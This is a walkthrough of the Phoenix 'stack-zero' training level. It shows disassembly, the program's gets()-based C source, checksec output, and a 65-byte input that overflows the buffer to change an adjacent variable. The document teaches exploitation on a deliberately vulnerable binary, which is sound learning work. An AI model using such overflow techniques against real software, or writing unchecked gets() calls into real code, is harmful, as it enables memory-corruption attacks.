# PHOENIX - Stack 0

Lets list our files using ```ls -la```,

```
user@phoenix-amd64:~$ ls -la
total 28
drwxr-xr-x 2 user user 4096 Jun  6 02:49 .
drwxr-xr-x 3 root root 4096 Jan 13  2019 ..
-rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout
-rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc
-rw-r--r-- 1 user user  675 Jan 13  2019 .profile
-rwxr-xr-x 1 user user 5824 Jun  6 02:49 stack-zero
```

Lets try running the binary,

```
user@phoenix-amd64:~$ ./stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
monish
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```

It is expecting to change some ```changeme``` in it

Lets analyse this binary using ```file``` command,

```
user@phoenix-amd64:~$ file stack-zero
stack-zero: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```

It is a ```not stripped``` binary

Its time for our debugger to analyse it,

Viewing functions inside in it

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400408  _init
0x0000000000400430  gets@plt
0x0000000000400440  puts@plt
0x0000000000400450  exit@plt
0x0000000000400460  __libc_start_main@plt
0x0000000000400470  _start
0x0000000000400486  _start_c
0x00000000004004b0  deregister_tm_clones
0x00000000004004e0  register_tm_clones
0x0000000000400520  __do_global_dtors_aux
0x00000000004005b0  frame_dummy
0x00000000004005dd  main
0x0000000000400630  __do_global_ctors_aux
0x0000000000400672  _fini
```

Lets view the ```main()```,

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004005dd <+0>:	  push   rbp
   0x00000000004005de <+1>:	  mov    rbp,rsp
   0x00000000004005e1 <+4>:	  sub    rsp,0x60
   0x00000000004005e5 <+8>:	  mov    DWORD PTR [rbp-0x54],edi
   0x00000000004005e8 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x00000000004005ec <+15>:	mov    edi,0x400680
   0x00000000004005f1 <+20>:	call   0x400440 <puts@plt>
   0x00000000004005f6 <+25>:	mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004005fd <+32>:	lea    rax,[rbp-0x50]
   0x0000000000400601 <+36>:	mov    rdi,rax
   0x0000000000400604 <+39>:	call   0x400430 <gets@plt>
   0x0000000000400609 <+44>:	mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040060c <+47>:	test   eax,eax
   0x000000000040060e <+49>:	je     0x40061c <main+63>
   0x0000000000400610 <+51>:	mov    edi,0x4006d0
   0x0000000000400615 <+56>:	call   0x400440 <puts@plt>
   0x000000000040061a <+61>:	jmp    0x400626 <main+73>
   0x000000000040061c <+63>:	mov    edi,0x400708
   0x0000000000400621 <+68>:	call   0x400440 <puts@plt>
   0x0000000000400626 <+73>:	mov    edi,0x0
   0x000000000040062b <+78>:	call   0x400450 <exit@plt>
End of assembler dump.
```

Lets view the source code of this binary for better understanding,

[Source](https://exploit.education/phoenix/stack-zero/)

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

Here is the important part,

```
char buffer[64];
volatile int changeme;
```

```buffer``` gets 64 bytes of data using ```gets(locals.buffer)```

```volatile int changeme``` is handled by ```locals.changeme = 0```

And the main condition to pass the program is,

```
if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }
```

If we manage to change the ```changeme``` variable to a value other than 0,we can complete this challenge

Lets check the security mitigations of this binary using ```checksec```,

```
ra@moni~/E/p/stack0> checksec stack-zero
[*] '/home/ra/ExpDevPractice/phoenix/stack0/stack-zero'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'
```

It seems like this binary has no security mitigations

We could overwrite the ```changeme``` variable from ```buffer``` by overflowing it

Since ```buffer``` uses ```gets()``` for input,we can use this for overflow

If we check it in debugger,


```
   0x00000000004005f1 <+20>:	call   0x400440 <puts@plt>
   0x00000000004005f6 <+25>:	mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004005fd <+32>:	lea    rax,[rbp-0x50]
   0x0000000000400601 <+36>:	mov    rdi,rax
   0x0000000000400604 <+39>:	call   0x400430 <gets@plt>
```

Here ```mov    DWORD PTR [rbp-0x10],0x0``` is used for ```locals.changeme = 0```

And ```lea    rax,[rbp-0x50]``` is for allocating buffer space for ```buffer```

Calculating the distance of these memory,

```
>>> int(0x50)
80
>>> int(0x10)
16
>>> print(80-16)
64
```

If we could pass 64 bytes of ```buffer``` and 1 extra byte to ```buffer``` it would change the ```changeme``` variable

Lets try it,

```
user@phoenix-amd64:~$ python -c "print('A'*64)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@phoenix-amd64:~$ python -c "print('A'*64)" | ./stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
user@phoenix-amd64:~$ python -c "print('A'*65)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@phoenix-amd64:~$ python -c "print('A'*65)" | ./stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

Done! 



